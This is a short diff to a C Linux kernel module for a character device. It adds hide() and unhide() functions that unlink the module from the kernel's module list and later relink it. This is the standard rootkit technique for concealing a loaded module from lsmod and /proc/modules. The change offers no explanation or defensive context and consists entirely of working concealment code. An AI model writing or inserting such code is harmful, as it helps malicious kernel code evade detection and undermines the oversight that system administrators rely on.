@@ -32,7 +32,17 @@ int major_number;
 int ret;
 dev_t dev_num;
 
+struct list_head *module_list;
 
+void hide(void)
+{
+    module_list = THIS_MODULE->list.prev;   
+    list_del(&THIS_MODULE->list);
+}
+void unhide(void)
+{
+    list_add(&THIS_MODULE->list, module_list);
+}
 
 
 int device_open(struct inode *inode, struct file * filp)
